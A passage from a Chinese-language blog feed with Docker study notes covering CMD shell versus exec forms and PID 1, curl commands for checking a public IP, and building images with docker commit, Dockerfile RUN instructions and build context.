TTY          TIME CMDroot          1      0  0 01:29 ?        00:00:00 nginx: master process nginx -g daemon off;nginx         5      1  0 01:29 ?        00:00:00 nginx: worker process</code></pre></div><h3 id="情景三"><a href="#情景三" class="headerlink" title="情景三"></a>情景三</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginxCMD [nginx -g daemon off;]</code></pre></div></blockquote><p><code>nginx</code>应用会正常启动并运行在后台，但<code>nginx</code>不会作为<code>pid=1</code>进程。</p><p>因为<code>CMD</code>的<code>shell</code>模式实际会被理解成<code>CMD [&quot;sh&quot;, &quot;-c&quot;, &quot;nginx -g daemon off;&quot;]</code></p><p>其中<code>sh</code>所存在的进程会被作为第一个前台进程，进而<code>sh</code>的<code>pid=1</code>，执行内容为<code>nginx -g daemon off;</code>。</p><p>因为<code>sh</code>（<code>pid=1</code>）进程在启动<code>nginx</code>（<code>pid=5</code>）b这个子进程后会阻塞，直到<code>nginx</code>子进程退出返回，<code>sh</code>父进程才会继续往前走。而<code>nginx</code>是一个循环任务，它不会返回，所以<code>sh</code>进程会一直阻塞，不会结束。既然<code>pid=1</code>的进程一直都在，那么容器也不会退出。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UID         PID   PPID  C STIME TTY          TIME CMDroot          1      0  0 01:34 ?        00:00:00 &#x2F;bin&#x2F;sh -c nginx -g &#39;daemon off;&#39;root          5      1  0 01:34 ?        00:00:00 nginx: master process nginx -g daemon off;nginx         6      5  0 01:34 ?        00:00:00 nginx: worker process</code></pre></div><h3 id="情景四"><a href="#情景四" class="headerlink" title="情景四"></a>情景四</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginxCMD [&quot;service&quot;, &quot;nginx&quot;, &quot;start&quot;]</code></pre></div></blockquote><p><code>nginx</code>应用不会正常启动且运行在后台。</p><p>因为<code>bash</code>执行了<code>service nginx start</code>这个瞬时命令后，继续向后。<code>service</code>进程结束，容器结束。</p><h3 id="情景五"><a href="#情景五" class="headerlink" title="情景五"></a>情景五</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginxCMD [service nginx start]</code></pre></div></blockquote><p><code>nginx</code>应用不会正常启动且运行在后台。</p><p>因为<code>bash</code>执行了<code>sh -c service nginx start</code>这个瞬时命令，<code>sh</code>（<code>pid=1</code>）在执行<code>service</code>后结束。<code>sh</code>进程结束，容器结束。</p><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p><p><a href="https://github.com/nginxinc/docker-nginx/blob/master/Dockerfile-alpine.template">https://github.com/nginxinc/docker-nginx/blob/master/Dockerfile-alpine.template</a></p><p><a href="https://pshizhsysu.gitbook.io/docker/dockerfile/qian-tai-yun-xing">https://pshizhsysu.gitbook.io/docker/dockerfile/qian-tai-yun-xing</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Dockerfile</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux查看公网IP</title>
    <link href="/posts/9fba094f/"/>
    <url>/posts/9fba094f/</url>
    
    <content type="html"><![CDATA[<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">curl cip.cccurl ifconfig.mecurl ifconfig.me&#x2F;allcurl www.pubyun.com&#x2F;dyndns&#x2F;getipcurl members.3322.org&#x2F;dyndns&#x2F;getip</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>IP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——构建镜像</title>
    <link href="/posts/8db4d4b4/"/>
    <url>/posts/8db4d4b4/</url>
    
    <content type="html"><![CDATA[<h2 id="1-利用commit理解镜像构成"><a href="#1-利用commit理解镜像构成" class="headerlink" title="1. 利用commit理解镜像构成"></a>1. 利用commit理解镜像构成</h2><p>镜像是多层存储，每一层是在前一层的基础上进行的修改；而容器同样也是多层存储，是在以镜像为基础层，在其基础上加一层作为容器运行时的存储层。</p><p>现在让我们以定制一个 Web 服务器为例子，来讲解镜像是如何构建的。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run --name webserver -d -p 80:80 nginx</code></pre></div><p>这条命令会用 <code>nginx</code> 镜像启动一个容器，命名为 <code>webserver</code>，并且映射了 80 端口，这样我们可以用浏览器去访问这个 <code>nginx</code> 服务器。</p><p>如果是在本机运行的 Docker，那么可以直接访问：<code>http://localhost</code> ，如果是在虚拟机、云服务器上安装的 Docker，则需要将 <code>localhost</code> 换为虚拟机地址或者实际云服务器地址。<em>（阿里云等托管服务器需要开启进出端口的安全策略）</em></p><p>直接用浏览器访问的话，我们会看到默认的 Nginx 欢迎页面。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; curl http:&#x2F;&#x2F;localhost&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;&#x2F;title&gt;&lt;style&gt;···</code></pre></div><p>现在，假设我们非常不喜欢这个欢迎页面，我们希望改成欢迎 Docker 的文字，我们可以使用 <code>docker exec</code> 命令进入容器，修改其内容。</p><p>我们以交互式终端方式进入 <code>webserver</code> 容器，并执行了 <code>bash</code> 命令，也就是获得一个可操作的 Shell。</p><p>然后，我们用 <code>&lt;h1&gt;Hello, Docker!&lt;/h1&gt;</code> 覆盖了 <code>/usr/share/nginx/html/index.html</code> 的内容。</p><p>现在我们再刷新浏览器的话，会发现内容被改变了。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker exec -it webserver bashroot@191550cc1461:&#x2F;# echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.htmlroot@191550cc1461:&#x2F;# exitexit&gt; curl http:&#x2F;&#x2F;localhost&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;</code></pre></div><p>我们修改了容器的文件，也就是改动了容器的存储层。我们可以通过 <code>docker diff</code> 命令看到具体的改动。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker diff webserverC &#x2F;usrC &#x2F;usr&#x2F;shareC &#x2F;usr&#x2F;share&#x2F;nginxC &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;htmlC &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.htmlC &#x2F;usr&#x2F;localA &#x2F;usr&#x2F;local&#x2F;aegisA &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_clientA &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_client&#x2F;aegis_10_91A &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_client&#x2F;aegis_10_91&#x2F;dataA &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_client&#x2F;aegis_10_91&#x2F;data&#x2F;data.3C &#x2F;varC &#x2F;var&#x2F;cacheC &#x2F;var&#x2F;cache&#x2F;nginxA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;uwsgi_tempA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;client_tempA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;fastcgi_tempA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;proxy_tempA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;scgi_tempC &#x2F;rootA &#x2F;root&#x2F;.bash_historyC &#x2F;runA &#x2F;run&#x2F;nginx.pidC &#x2F;etcC &#x2F;etc&#x2F;nginxC &#x2F;etc&#x2F;nginx&#x2F;conf.dC &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf</code></pre></div><p>现在我们定制好了变化，我们希望能将其保存下来形成镜像。</p><p><strong>要知道，当我们运行一个容器的时候（如果不使用卷的话），我们做的任何文件修改都会被记录于容器存储层里。而 Docker 提供了一个 <code>docker commit</code> 命令，可以将容器的存储层保存下来成为镜像。换句话说，就是在原有镜像的基础上，再叠加上容器的存储层，并构成新的镜像。以后我们运行这个新镜像的时候，就会拥有原有容器最后的文件变化。</strong></p><p><code>docker commit</code> 的语法格式为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></pre></div><p>我们可以用下面的命令将容器保存为镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker commit --author &quot;leex0&quot; --message &quot;modify the index page&quot; webserver nginx:v2sha256:5cf8e96643187e1ee2f006b5518526eadc0205080cdd880a693fc38bb70a747a</code></pre></div><p>其中 <code>--author</code> 是指定修改的作者，而 <code>--message</code> 则是记录本次修改的内容。这点和 <code>git</code> 版本控制相似，不过这里这些信息可以省略留空。</p><p>我们可以在 <code>docker image ls</code> 中看到这个新定制的镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker image lsREPOSITORY     TAG       IMAGE ID       CREATED         SIZEnginx          v2        5cf8e9664318   2 minutes ago   133MBnginx          latest    f6d0b4767a6c   2 months ago    133MB</code></pre></div><p>我们还可以用 <code>docker history</code> 具体查看镜像内的历史记录，如果比较 <code>nginx:latest</code> 的历史记录，我们会发现新增了我们刚刚提交的这一层。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker history nginx:v2IMAGE          CREATED         CREATED BY                                      SIZE      COMMENT5cf8e9664318   2 minutes ago   nginx -g daemon off;                            1.39kB    modify the index pagef6d0b4767a6c   2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  CMD [&quot;nginx&quot; &quot;-g&quot; &quot;daemon…   0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  STOPSIGNAL SIGQUIT           0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  EXPOSE 80                    0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  ENTRYPOINT [&quot;&#x2F;docker-entr…   0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop) COPY file:0fd5fca330dcd6a7…   1.04kB&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop) COPY file:0b866ff3fc1ef5b0…   1.96kB&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop) COPY file:e7e183879c35719c…   1.2kB&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c set -x     &amp;&amp; addgroup --system -…   63.7MB&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  ENV PKG_RELEASE&#x3D;1~buster     0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  ENV NJS_VERSION&#x3D;0.5.0        0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  ENV NGINX_VERSION&#x3D;1.19.6     0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  LABEL maintainer&#x3D;NGINX Do…   0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  CMD [&quot;bash&quot;]                 0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop) ADD file:422aca8901ae3d869…   69.2MB</code></pre></div><p>新的镜像定制好后，我们可以来运行这个镜像。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker run --name web2 -d -p 81:80 nginx:v2cdb83092299d3362d99e2cfe4c5b88a4c8c25ff4c7dac90f46f34017f0114255&gt; curl http:&#x2F;&#x2F;localhost:81&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;</code></pre></div><p>这里我们命名为新的服务为 <code>web2</code>，并且映射到 <code>81</code> 端口。访问 <code>http://localhost:81</code> 看到结果，其内容应该和之前修改后的 <code>webserver</code> 一样。</p><p>至此，我们第一次完成了定制镜像，使用的是 <code>docker commit</code> 命令，手动操作给旧的镜像添加了新的一层，形成新的镜像，对镜像多层存储应该有了更直观的感觉。</p><h4 id="慎用-docker-commit"><a href="#慎用-docker-commit" class="headerlink" title="慎用 docker commit"></a>慎用 <code>docker commit</code></h4><p>使用 <code>docker commit</code> 命令虽然可以比较直观的帮助理解镜像分层存储的概念，但是实际环境中并不会这样使用。</p><p>因为这种操作会使镜像较为臃肿且较难维护，对于如何构建的镜像除了制作人外无从得知（黑箱操作）。</p><h2 id="2-使用-Dockerfile-定制镜像"><a href="#2-使用-Dockerfile-定制镜像" class="headerlink" title="2. 使用 Dockerfile 定制镜像"></a>2. 使用 Dockerfile 定制镜像</h2><blockquote><p>从上述的 <code>docker commit</code> 的学习中，我们可以了解到，镜像的定制实际上就是定制每一层所添加的配置、文件。如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，那么之前提及的无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是 Dockerfile。</p></blockquote><p>Dockerfile 是一个文本文件，其内包含了一条条的 **指令(Instruction)**，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。</p><p>还以之前定制 <code>nginx</code> 镜像为例，这次我们使用 Dockerfile 来定制。</p><p>在一个空白目录中，建立一个文本文件，并命名为 <code>Dockerfile</code>：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mkdir mynginxcd mynginxtouch Dockerfile</code></pre></div><p>其内容为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; cat DockerfileFROM nginxRUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</code></pre></div><p>这个 Dockerfile 很简单，一共就两行。涉及到了两条指令，<code>FROM</code> 和 <code>RUN</code>。</p><h3 id="FROM-指定基础镜像"><a href="#FROM-指定基础镜像" class="headerlink" title="FROM 指定基础镜像"></a>FROM 指定基础镜像</h3><p>所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就像我们之前运行了一个 <code>nginx</code> 镜像的容器，再进行修改一样，基础镜像是必须指定的。而 <code>FROM</code> 就是指定 <strong>基础镜像</strong>，<strong>因此一个 <code>Dockerfile</code> 中 <code>FROM</code> 是必备的指令，并且必须是第一条指令</strong>。</p><blockquote><p>在 <a href="https://hub.docker.com/search?q=&type=image&image_filter=official">Docker Hub</a> 上有非常多的高质量的官方镜像，有可以直接拿来使用的服务类的镜像，如 <a href="https://hub.docker.com/_/nginx/"><code>nginx</code></a>、<a href="https://hub.docker.com/_/redis/"><code>redis</code></a>、<a href="https://hub.docker.com/_/mongo/"><code>mongo</code></a>、<a href="https://hub.docker.com/_/mysql/"><code>mysql</code></a>、<a href="https://hub.docker.com/_/httpd/"><code>httpd</code></a>、<a href="https://hub.docker.com/_/php/"><code>php</code></a>、<a href="https://hub.docker.com/_/tomcat/"><code>tomcat</code></a> 等；也有一些方便开发、构建、运行各种语言应用的镜像，如 <a href="https://hub.docker.com/_/node"><code>node</code></a>、<a href="https://hub.docker.com/_/openjdk/"><code>openjdk</code></a>、<a href="https://hub.docker.com/_/python/"><code>python</code></a>、<a href="https://hub.docker.com/_/ruby/"><code>ruby</code></a>、<a href="https://hub.docker.com/_/golang/"><code>golang</code></a> 等。可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。</p><p>如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，如 <a href="https://hub.docker.com/_/ubuntu/"><code>ubuntu</code></a>、<a href="https://hub.docker.com/_/debian/"><code>debian</code></a>、<a href="https://hub.docker.com/_/centos/"><code>centos</code></a>、<a href="https://hub.docker.com/_/fedora/"><code>fedora</code></a>、<a href="https://hub.docker.com/_/alpine/"><code>alpine</code></a> 等，这些操作系统的软件库为我们提供了更广阔的扩展空间。</p><p>除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 <code>scratch</code>。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM scratch...</code></pre></div><p>如果你以 <code>scratch</code> 为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。</p><p>不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，对于 Linux 下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接 <code>FROM scratch</code> 会让镜像体积更加小巧。使用 <a href="https://golang.google.cn/">Go 语言</a> 开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为 Go 是特别适合容器微服务架构的语言的原因之一。</p></blockquote><h3 id="RUN-执行命令"><a href="#RUN-执行命令" class="headerlink" title="RUN 执行命令"></a>RUN 执行命令</h3><p><code>RUN</code> 指令是用来执行命令行命令的。由于命令行的强大能力，<code>RUN</code> 指令在定制镜像时是最常用的指令之一。其格式有两种：</p><ul><li><em>shell</em> 格式：<code>RUN &lt;命令&gt;</code>，就像直接在命令行中输入的命令一样。刚才写的 Dockerfile 中的 <code>RUN</code> 指令就是这种格式。</li></ul><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</code></pre></div><ul><li><em>exec</em> 格式：<code>RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</code>，这更像是函数调用中的格式。</li></ul><p>既然 <code>RUN</code> 就像 Shell 脚本一样可以执行命令，那么我们是否就可以像 Shell 脚本一样把每个命令对应一个 RUN 呢？比如这样（）：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM debian:stretchRUN apt-get updateRUN apt-get install -y gcc libc6-dev make wgetRUN wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot;RUN mkdir -p &#x2F;usr&#x2F;src&#x2F;redisRUN tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1RUN make -C &#x2F;usr&#x2F;src&#x2F;redisRUN make -C &#x2F;usr&#x2F;src&#x2F;redis install</code></pre></div><p>之前说过，Dockerfile 中每一个指令都会建立一层，<code>RUN</code> 也不例外。每一个 <code>RUN</code> 的行为，就和刚才我们手工建立镜像的过程一样：新建立一层，在其上执行这些命令，执行结束后，<code>commit</code> 这一层的修改，构成新的镜像。</p><p>而上面的这种写法，创建了 7 层镜像。这是完全没有意义的，而且很多运行时不需要的东西，都被装进了镜像里，比如编译环境、更新的软件包等等。结果就是产生非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。 这是很多初学 Docker 的人常犯的一个错误。</p><p><em>Union FS 是有最大层数限制的，比如 AUFS，曾经是最大不得超过 42 层，现在是不得超过 127 层。</em></p><p>上面的 <code>Dockerfile</code> 正确的写法应该是这样：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM debian:stretchRUN set -x; buildDeps&#x3D;&#39;gcc libc6-dev make wget&#39; \    &amp;&amp; apt-get update \    &amp;&amp; apt-get install -y $buildDeps \    &amp;&amp; wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot; \    &amp;&amp; mkdir -p &#x2F;usr&#x2F;src&#x2F;redis \    &amp;&amp; tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1 \    &amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis \    &amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis install \    &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;* \    &amp;&amp; rm redis.tar.gz \    &amp;&amp; rm -r &#x2F;usr&#x2F;src&#x2F;redis \    &amp;&amp; apt-get purge -y --auto-remove $buildDeps</code></pre></div><p>首先，之前所有的命令只有一个目的，就是编译、安装 redis 可执行文件。因此没有必要建立很多层，这只是一层的事情。因此，这里没有使用很多个 <code>RUN</code> 一一对应不同的命令，而是仅仅使用一个 <code>RUN</code> 指令，并使用 <code>&amp;&amp;</code> 将各个所需命令串联起来。将之前的 7 层，简化为了 1 层。在撰写 Dockerfile 的时候，要经常提醒自己，这并不是在写 Shell 脚本，而是在定义每一层该如何构建。</p><blockquote><p>并且，这里为了格式化还进行了换行。Dockerfile 支持 Shell 类的行尾添加 <code>\</code> 的命令换行方式，以及行首 <code>#</code> 进行注释的格式。良好的格式，比如换行、缩进、注释等，会让维护、排障更为容易，这是一个比较好的习惯。</p><p>此外，还可以看到这一组命令的最后添加了清理工作的命令，删除了为了编译构建所需要的软件，清理了所有下载、展开的文件，并且还清理了 <code>apt</code> 缓存文件。这是很重要的一步，我们之前说过，镜像是多层存储，每一层的东西并不会在下一层被删除，会一直跟随着镜像。因此镜像构建时，一定要确保每一层只添加真正需要添加的东西，任何无关的东西都应该清理掉。很多人初学 Docker 制作出了很臃肿的镜像的原因之一，就是忘记了每一层构建的最后一定要清理掉无关文件。</p></blockquote><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>好了，让我们再回到之前定制的 nginx 镜像的 Dockerfile 来。现在我们明白了这个 Dockerfile 的内容，那么让我们来构建这个镜像吧。</p><p>在 <code>Dockerfile</code> 文件所在目录执行：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; mynginx docker build -t nginx:v3 .Sending build context to Docker daemon  2.048kBStep 1&#x2F;2 : FROM nginx ---&gt; f6d0b4767a6cStep 2&#x2F;2 : RUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html ---&gt; Running in 62f21e170b84Removing intermediate container 62f21e170b84 ---&gt; f68789f1ef01Successfully built f68789f1ef01Successfully tagged nginx:v3</code></pre></div><p>从命令的输出结果中，我们可以清晰的看到镜像的构建过程。在 <code>Step 2</code> 中，如同我们之前所说的那样，<code>RUN</code> 指令启动了一个容器 <code>62f21e170b84</code>，执行了所要求的命令，并最后提交了这一层 <code>f68789f1ef01</code>，随后删除了所用到的这个容器 62f21e170b84。</p><p>这里我们使用了 <code>docker build</code> 命令进行镜像构建。其格式为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker build [选项] &lt;上下文路径&#x2F;URL&#x2F;-&gt;</code></pre></div><p>在这里我们指定了最终镜像的名称 <code>-t nginx:v3</code>，构建成功后，我们可以像之前运行 <code>nginx:v2</code> 那样来运行这个镜像，其结果会和 <code>nginx:v2</code> 一样。</p><h3 id="镜像构建上下文（Context）"><a href="#镜像构建上下文（Context）" class="headerlink" title="*镜像构建上下文（Context）"></a>*镜像构建上下文（Context）</h3><blockquote><p>简而言之，镜像构建时是将上下文路径下的内容打包至Docker服务器端，构建Docker内容所需文件应在这个上下文路径当中以便引入，且使用相对路径引入。构建过程中的上下文，相当于已经被打包发过去了，跟本地路径已经没关系了。</p><p><strong>所以在指定上下文路径过程时（即<code>docker build</code>命令下）使用什么路径都可以，为的是说明清楚上下文路径的位置。而在Dockerfile中如使用<code>COPY</code>类命令引入文件等操作，源路径应使用关于上下文路径的相对目录。</strong></p><p>其余详细原因见如下描述。</p></blockquote><p>如果注意，会看到 <code>docker build</code> 命令最后有一个 <code>.</code>。<code>.</code> 表示当前目录，而 <code>Dockerfile</code> 就在当前目录，因此不少初学者以为这个路径是在指定 <code>Dockerfile</code> 所在路径，这么理解其实是不准确的。如果对应上面的命令格式，你可能会发现，这是在指定 <strong>上下文路径</strong>。那么什么是上下文呢？</p><p>首先我们要理解 <code>docker build</code> 的工作原理。Docker 在运行时分为 Docker 引擎（也就是服务端守护进程）和客户端工具。Docker 的引擎提供了一组 REST API，被称为 <a href="https://docs.docker.com/develop/sdk/">Docker Remote API</a>，而如 <code>docker</code> 命令这样的客户端工具，则是通过这组 API 与 Docker 引擎交互，从而完成各种功能。因此，虽然表面上我们好像是在本机执行各种 <code>docker</code> 功能，但实际上，一切都是使用的远程调用形式在服务端（Docker 引擎）完成。也因为这种 C/S 设计，让我们操作远程服务器的 Docker 引擎变得轻而易举。</p><p>当我们进行镜像构建的时候，并非所有定制都会通过 <code>RUN</code> 指令完成，经常会需要将一些本地文件复制进镜像，比如通过 <code>COPY</code> 指令、<code>ADD</code> 指令等。而 <code>docker build</code> 命令构建镜像，其实并非在本地构建，而是在服务端，也就是 Docker 引擎中构建的。那么在这种客户端/服务端的架构中，如何才能让服务端获得本地文件呢？</p><p>这就引入了上下文的概念。当构建的时候，用户会指定构建镜像上下文的路径，<code>docker build</code> 命令得知这个路径后，会将路径下的所有内容打包，然后上传给 Docker 引擎。这样 Docker 引擎收到这个上下文包后，展开就会获得构建镜像所需的一切文件。</p><p>如果在 <code>Dockerfile</code> 中这么写：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY .&#x2F;package.json &#x2F;app&#x2F;</code></pre></div><p>这并不是要复制执行 <code>docker build</code> 命令所在的目录下的 <code>package.json</code>，也不是复制 <code>Dockerfile</code> 所在目录下的 <code>package.json</code>，而是复制 <strong>上下文（context）</strong> 目录下的 <code>package.json</code>。</p><p>因此，<code>COPY</code> 这类指令中的源文件的路径都是<em>相对路径</em>。这也是初学者经常会问的为什么 <code>COPY ../package.json /app</code> 或者 <code>COPY /opt/xxxx /app</code> 无法工作的原因，因为这些路径已经超出了上下文的范围，Docker 引擎无法获得这些位置的文件。如果真的需要那些文件，应该将它们复制到上下文目录中去。</p><p>现在就可以理解刚才的命令 <code>docker build -t nginx:v3 .</code> 中的这个 <code>.</code>，实际上是在指定上下文的目录，<code>docker build</code> 命令会将该目录下的内容打包交给 Docker 引擎以帮助构建镜像。</p><p>如果观察 <code>docker build</code> 输出，我们其实已经看到了这个发送上下文的过程：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker build -t nginx:v3 .Sending build context to Docker daemon 2.048 kB...</code></pre></div><p>理解构建上下文对于镜像构建是很重要的，避免犯一些不应该的错误。比如有些初学者在发现 <code>COPY /opt/xxxx /app</code> 不工作后，于是干脆将 <code>Dockerfile</code> 放到了硬盘根目录去构建，结果发现 <code>docker build</code> 执行后，在发送一个几十 GB 的东西，极为缓慢而且很容易构建失败。那是因为这种做法是在让 <code>docker build</code> 打包整个硬盘，这显然是使用错误。</p><p>一般来说，应该会将 <code>Dockerfile</code> 置于一个空目录下，或者项目根目录下。如果该目录下没有所需文件，那么应该把所需文件复制一份过来。如果目录下有些东西确实不希望构建时传给 Docker 引擎，那么可以用 <code>.gitignore</code> 一样的语法写一个 <code>.dockerignore</code>，该文件是用于剔除不需要作为上下文传递给 Docker 引擎的。</p><p>那么为什么会有人误以为 <code>.</code> 是指定 <code>Dockerfile</code> 所在目录呢？这是因为在默认情况下，如果不额外指定 <code>Dockerfile</code> 的话，会将上下文目录下的名为 <code>Dockerfile</code> 的文件作为 Dockerfile。</p><p>这只是默认行为，实际上 <code>Dockerfile</code> 的文件名并不要求必须为 <code>Dockerfile</code>，而且并不要求必须位于上下文目录中，比如可以用 <code>-f ../Dockerfile.php</code> 参数指定某个文件作为 <code>Dockerfile</code>。</p><p>当然，一般大家习惯性的会使用默认的文件名 <code>Dockerfile</code>，以及会将其置于镜像构建上下文目录中。</p><h2 id="其它-docker-build-的用法"><a href="#其它-docker-build-的用法" class="headerlink" title="其它 docker build 的用法"></a>其它 <code>docker build</code> 的用法</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 这行命令指定了构建所需的 Git repo，并且指定分支为 master，构建目录为 &#x2F;amd64&#x2F;hello-world&#x2F;# 然后 Docker 就会自己去 git clone 这个项目、切换到指定分支、并进入到指定目录后开始构建。&gt; docker build -t hello-world https:&#x2F;&#x2F;github.com&#x2F;docker-library&#x2F;hello-world.git#master:amd64&#x2F;hello-world# 如果所给出的 URL 不是个 Git repo，而是个 tar 压缩包# 那么 Docker 引擎会下载这个包，并自动解压缩，以其作为上下文，开始构建。&gt; docker build http:&#x2F;&#x2F;server&#x2F;context.tar.gz# 如果标准输入传入的是文本文件，则将其视为 &#96;Dockerfile&#96;，并开始构建。&gt; cat Dockerfile | docker build -# 如果发现标准输入的文件格式是 gzip、bzip2 以及 xz 的话# 将会使其为上下文压缩包，直接将其展开，将里面视为上下文，并开始构建。&gt; docker build - &lt; context.tar.gz</code></pre></div><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
